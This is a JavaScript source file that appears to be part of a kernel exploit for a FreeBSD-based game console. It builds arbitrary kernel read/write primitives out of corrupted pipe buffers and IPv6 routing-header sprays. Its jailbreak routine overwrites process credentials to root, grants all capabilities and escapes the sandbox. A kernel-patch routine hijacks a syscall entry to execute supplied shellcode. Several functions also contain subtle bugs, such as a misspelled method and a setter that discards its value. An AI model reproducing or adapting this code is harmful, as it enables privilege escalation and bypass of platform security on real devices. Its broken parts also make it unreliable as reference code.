//#region Constants
const KERNEL_PID = 0;

const PAGE_SIZE = 0x4000;

const SYSCORE_AUTHID = new BInt("0x4800000000000007");

const FIOSETOWN = 0x8004667c;

const F_SETFL = 4;

const O_NONBLOCK = 4;

const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
const SO_SNDBUF = 0x1001;

const IPPROTO_TCP = 6;
const IPPROTO_IPV6 = 41;

const TCP_INFO = 32;
const TCPS_ESTABLISHED = 4;

const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

const RTP = 0x100;
const RTP_SET = 1;
const MAIN_CORE = 7;
const CPU_WHICH_TID = 1;
const CPU_LEVEL_WHICH = 3;
const RTP_PRIO_REALTIME = 2;

const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const TCP_INFO_SIZE = 0xec;
const FILEDESCENT_SIZE = 8;

const master_pipe = new Array(2);
const slave_pipe = new Array(2);

let spray_rthdr0_len = undefined;
let spray_rthdr0_addr = undefined;
let leak_rthdr0_addr = undefined;

let kernel_base = undefined;
let fdt_ofiles = undefined;
let allproc = undefined;

let kv = undefined;

fn.setuid = new NativeFunction(0x17, "number");
fn.pipe = new NativeFunction(0x2a, "number");
fn.ioctl = new NativeFunction(0x36, "number");
fn.fcntl = new NativeFunction(0x5c, "number");
fn.socket = new NativeFunction(0x61, "number");
fn.setsockopt = new NativeFunction(0x69, "number");
fn.getsockopt = new NativeFunction(0x76, "number");
fn.sched_yield = new NativeFunction(0x14b, "number");
fn.rtprio_thread = new NativeFunction(0x1d2, "number");
fn.cpuset_setaffinity = new NativeFunction(0x1e8, "number");
fn.kexec = new NativeFunction(0x295, "number");
//#endregion
//#region Classes
class KernelView {
  constructor(master_pipe, slave_pipe) {
    if (!Array.isArray(master_pipe) || master_pipe.length !== 2) {
      throw new Error("pipe should have 2 fds for r/w");
    }

    if (!Array.isArray(slave_pipe) || slave_pipe.length !== 2) {
      throw new Error("pipe should have 2 fds for r/w");
    }

    this.view = new DataView(new ArrayBuffer(8));
    this.master_pipe = master_pipe.slice();
    this.slave_pipe = slave_pipe.slice();

    if (fn.fcntl.invoke(this.master_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.master_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);
    }

    if (fn.fcntl.invoke(this.slave_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.slave_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[1]}`);
    }

    this.pipe_buf = pipebuf.new();
    this.pipe_buf.size = PAGE_SIZE;
  }

  free() {
    mem.free(this.pipe_buf.addr);
  }

  get dv_backing() {
    return this.view.buffer.data();
  }

  get pipe_backing() {
    return this.pipe_buf.buffer;
  }

  set pipe_backing(addr) {
    if (addr.eq(0)) {
      throw new Error("Empty addr !!");
    }

    this.pipe_buf.buffer = addr;
  }

  get pipe_count() {
    return this.pipe_buf.cnt;
  }

  set pipe_count(count) {
    if (count < 0 && count > 0xffffffff) {
      throw new RangeError(`count ${count} out of range !!`);
    }

    this.pipe_buf.cnt = count;
  }

  flush() {
    if (fn.write.invoke(this.master_pipe[1], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);
    }

    if (fn.read.invoke(this.master_pipe[0], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);
    }
  }

  kread(dst, src, size) {
    this.pipe_backing = src;
    this.pipe_count = size;
    this.flush();

    const n = fn.read.invoke(this.slave_pipe[0], dst, size);
    if (n.eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);
    }

    return n;
  }

  kwrite(dst, src, size) {
    this.pipe_backing = dst;
    this.pipe_count = size;
    this.flush();

    const n = fn.write.invoke(this.slave_pipe[1], src, size);
    if (n.eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);
    }

    return n;
  }

  getFloat32(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return this.view.getFloat32(0, littleEndian);
  }

  getFloat64(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);

    return this.view.getFloat64(0, littleEndian);
  }

  getInt8(byteOffset) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);

    return this.view.getInt8(0);
  }

  getInt16(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);

    return this.view.getInt16(0, littleEndian);
  }

  getInt32(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return this.view.getInt32(0, littleEndian);
  }

  getUint8(byteOffset) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);

    return this.view.getUint8(0);
  }

  getUint16(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);

    return this.view.getUint16(0, littleEndian);
  }

  getUint32(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return this.view.getUint32(0, littleEndian);
  }

  getBInt(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);

    return this.view.getBInt(0, littleEndian);
  }

  setFloat32(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setFloat32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setFloat64(byteOffset, value, littleEndian = false) {
    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
  }

  setInt8(byteOffset, value) {
    this.view.setBInt(0, 0, true);
    this.view.setInt8(0, value);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
  }

  setInt16(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setInt16(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
  }

  setInt32(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setInt32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setUint8(byteOffset, value) {
    this.view.setBInt(0, 0, true);
    this.view.setUint8(0, value);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
  }

  setUint16(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setUint16(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
  }

  setUint32(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setUint32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setBInt(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
  }
}
//#endregion
//#region Functions
function pin_to_core(core) {
  const mask = cpuset.new();

  mask.bits0 = 1 << core;

  if (fn.cpuset_setaffinity.invoke(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, cpuset.sizeof, mask.addr) === -1) {
    throw new SyscallError(`Unable to setaffinity to core ${core}`);
  }

  mem.free(mask.addr);
}

function set_rtprio(value) {
  const prio = rtprio.new();

  prio.type = RTP_PRIO_REALTIME;
  prio.prio = value;

  if (fn.rtprio_thread.invoke(RTP_SET, 0, prio.addr) === -1) {
    throw new SyscallError(`Unable to set priority to ${value}`);
  }

  mem.free(prio.addr);
}

function build_rthdr(addr, size) {
  const rthdr0 = ip6_rthdr0.new(addr);

  const in6_count = Math.floor((size - ip6_rthdr0.sizeof) / in6_addr.sizeof);

  rthdr0.ip6r0_nxt = 0;
  rthdr0.ip6r0_len = in6_count * 2;
  rthdr0.ip6r0_type = 0;
  rthdr0.ip6r0_segleft = in6_count;

  return ip6_rthdr0.sizeof + in6_addr.sizeof * in6_count;
}

function get_rthdr(sock, size) {
  const leak_rthdr0_len_addr = mem.alloc(4);
  arw.view(leak_rthdr0_len_addr).setInt32(0, size, true);
  if (fn.getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0_addr, leak_rthdr0_len_addr) === -1) {
    throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
  }

  const leak_rthdr0_len = arw.view(leak_rthdr0_len_addr).getInt32(0, true);

  mem.free(leak_rthdr0_len_addr);

  return leak_rthdr0_len;
}

function set_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr0_addr, spray_rthdr0_len) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function free_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function make_socket(domain, type, protocol = 0) {
  const sock = fn.socket.invoke(domain, type, protocol);
  if (sock === -1) {
    throw new SyscallError("Unable to create socket !!");
  }

  return sock;
}

function make_karw_pipe() {
  const pair_addr = mem.alloc(8);

  // Create karw pipe
  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  master_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  master_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  slave_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  slave_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  logger.debug(`master_pipe: ${master_pipe}`);
  logger.debug(`slave_pipe: ${slave_pipe}`);

  mem.free(pair_addr);
}

function free_karw_pipe() {
  if (typeof kv === "undefined") {
    for (const fd of master_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }

    for (const fd of slave_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

function kview(addr) {
  if (kv.pipe_backing !== addr) {
    kv.pipe_backing = addr;
  }

  return kv;
}

function fget(fd) {
  return kview(fdt_ofiles).getBInt(fd * FILEDESCENT_SIZE, true);
}

function fput(fd, fp) {
  return kview(fdt_ofiles).getBInt(fd * FILEDESCENT_SIZE, fp, true);
}

function fhold(fp) {
  const f_count = kview(fp).getInt32(0x28, true);
  kview(fp).setInt32(0x28, f_count + 1, true);
}

function get_in6p_outputopts(fd) {
  const fp = fget(fd);
  const f_data = kview(fp).getBInt(0, true);
  const so_pcb = kview(f_data).getBInt(0x18, true);
  return kview(so_pcb).getBInt(0x118, true); // in6p_outputopts
}

function get_pktinfo_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).gerBInt(0x10, true); // ip6po_pktinfo
}

function get_rthdr_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBInt(0x68, true); // ip6po_rthdr
}

function remove_pktinfo_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBInt(0x10, 0, true); // ip6po_pktinfo
}

function remove_rthdr_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBInt(0x68, 0, true); // ip6po_rthdr
}

function inc_karw_pipe_refcnt() {
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(slave_pipe[0]));
  fhold(fget(slave_pipe[1]));
}

function pfind(pid) {
  let p = kview(allproc).getBInt(0, true);
  while (p.neq(0)) {
    const p_pid = kview(p).getInt32(0xb0, true);
    if (p_pid === pid) break;

    p = kview(p).getBInt(0, true); // p_list.le_next
  }

  return p;
}

function find_all_proc() {
  logger.info("Finding allproc...");

  const tmp_pipe = new Array(2);

  const pair_addr = mem.alloc(8);

  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  tmp_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  tmp_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  try {
    const pid = fn.getpid.invoke();
    const pid_addr = mem.alloc(4);
    arw.view(pid_addr).setInt32(0, pid, true);

    if (fn.ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr) === -1) {
      throw new SyscallError(`Unable to ioctl fd ${tmp_pipe[0]} !!`);
    }

    mem.free(pid_addr);

    const fp = fget(tmp_pipe[0]);
    const f_data = kview(fp).getBInt(0, true);
    const pipe_sigio = kview(f_data).getBInt(0xd0, true);
    let p = kview(pipe_sigio).getBInt(0, true);

    const mask = new BInt("0xffffffff00000000");
    while (p.and(mask).neq(mask)) {
      p = kview(p).getBInt(8, true); // p_list.le_prev
    }

    allproc = p;
    logger.info(`allproc: ${allproc}`);
  } finally {
    for (const fd of tmp_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

function jailbreak() {
  logger.info("Initiate jailbreak...");

  const p = pfind(fn.getpid.invoke());
  const kp = pfind(KERNEL_PID);

  // Patch credentials and capabilities
  const p_ucred = kview(p).getBInt(0x40, true);
  const kp_ucred = kview(kp).getBInt(0x40, true);

  const prison0 = kview(kp_ucred).getBInt(0x30, true);

  kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
  kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
  kview(p_ucred).setInt32(0x0c, 0, true); // cr_svuid
  kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
  kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
  kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
  kview(p_ucred).setBInt(0x30, prison0, true); // cr_prison
  kview(p_ucred).setBInt(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
  kview(p_ucred).setBInt(0x60, -1, true); // cr_sceCaps[1]
  kview(p_ucred).setBInt(0x68, -1, true); // cr_sceCaps[0]
  kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]

  // Allow root file system access
  const p_fd = kview(p).getBInt(0x48, true);
  const kp_fd = kview(kp).getBInt(0x48, true);

  const root_vnode = kview(kp_fd).getBInt(0x10, true);

  kview(p_fd).setBInt(0x10, root_vnode, true); // fd_rdir
  kview(p_fd).setBInt(0x18, root_vnode, true); // fd_jdir

  logger.info("Achieved jailbreak !!");
}

// intended for use only after kernel arw
function kernel_patches(shellcode) {
  logger.info("Applying kernel patches...");

  const sysent_661_addr = kernel_base.add(constants.SYSENT_661);
  logger.debug(`sysent_661_addr: ${sysent_661_addr}`);

  const jmp_rsi_gadget_addr = kernel_base.add(constants.JMP_RSI_GADGET);
  logger.debug(`jmp_rsi_gadget_addr: ${jmp_rsi_gadget_addr}`);

  const sy_narg = kview(sysent_661_addr).getUint32(0, true);
  const sy_call = kview(sysent_661_addr).getBInt(8, true);
  const sy_thrcnt = kview(sysent_661_addr).getUint32(0x2c, true);

  logger.debug(`sy_narg: ${sy_narg}`);
  logger.debug(`sy_call: ${sy_call}`);
  logger.debug(`sy_thrcnt: ${sy_thrcnt}`);

  kview(sysent_661_addr).setUint32(0, 2, true);
  kview(sysent_661_addr).setBInt(8, jmp_rsi_gadget_addr, true);
  kview(sysent_661_addr).setUint32(0x2c, 1, true);

  const size = shellcode.length.alignUp(PAGE_SIZE);
  const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  const flags = MAP_SHARED | MAP_FIXED;

  const exec_fd = fn.jitshm_create.invoke(0, size, prot);
  logger.debug(`exec_fd: ${exec_fd}`);
  if (exec_fd === -1) {
    throw new SyscallError("Unablet to create JIT shared memory with rwx !!");
  }

  const mapping_addr = new BInt(9, 0x20100000);

  if (fn.mmap.invoke(mapping_addr, size, prot, flags, exec_fd, 0).eq(-1)) {
    throw new SyscallError(`Unable to map memory with size ${size} with rwx !!`);
  }

  mem.copy(mapping_addr, shellcode.buffer.data(), shellcode.length);

  const ret = fn.kexec.invoke(mapping_addr);
  logger.debug(`kexec_ret: ${ret}`);
  if (ret === -1) {
    throw new SyscallError(`Unable to kexec ${mapping_addr} !!`);
  }

  kview(sysent_661_addr).setUint32(0, sy_narg, true);
  kview(sysent_661_addr).setBInt(8, sy_call, true);
  kview(sysent_661_addr).setUint32(0x2c, sy_thrcnt, true);

  logger.info("Kernel patches applied !!");
}
//#endregion
//#region Structs
const cpuset = new Struct("cpuset", [
  { type: "Uint64", name: "bits0" },
  { type: "Uint64", name: "bits1" },
]);

const rtprio = new Struct("rtprio", [
  { type: "Uint16", name: "type" },
  { type: "Uint16", name: "prio" },
]);

const in6_addr = new Struct("in6_addr", [{ type: "Uint8", name: "s6_addr", count: 16 }]);

const ip6_rthdr0 = new Struct("ip6_rthdr0", [
  { type: "Uint8", name: "ip6r0_nxt" },
  { type: "Uint8", name: "ip6r0_len" },
  { type: "Uint8", name: "ip6r0_type" },
  { type: "Uint8", name: "ip6r0_segleft" },
  { type: "Uint32", name: "ip6r0_reserved" },
]);

const pipebuf = new Struct("pipebuf", [
  { type: "Uint32", name: "cnt" },
  { type: "Uint32", name: "in" },
  { type: "Uint32", name: "out" },
  { type: "Uint32", name: "size" },
  { type: "Uint64", name: "buffer" },
]);
//#endregion
